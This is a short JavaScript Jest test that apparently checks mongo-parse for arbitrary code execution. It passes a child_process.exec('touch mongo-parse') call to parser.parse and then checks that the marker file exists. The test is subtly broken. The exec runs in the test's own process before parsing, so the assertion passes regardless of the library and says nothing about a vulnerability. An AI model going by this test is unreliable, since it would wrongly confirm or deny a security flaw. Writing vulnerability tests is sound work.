test("Arbitrary code execution in mongo-parse", (done) => {
  expect.assertions(2);
  const fs = require("fs");
  const parser = require("mongo-parse");
  const path = "./mongo-parse";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    let query = parser.parse(
      require("child_process").exec("touch mongo-parse")
    );
  } catch (error) {}
  // sleep.sleep(5);
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 500);
  // file_exist = fs.existsSync(path);
  // expect(file_exist).toBe(true);
  // fs.unlink(path, function (err) {
  // });
});
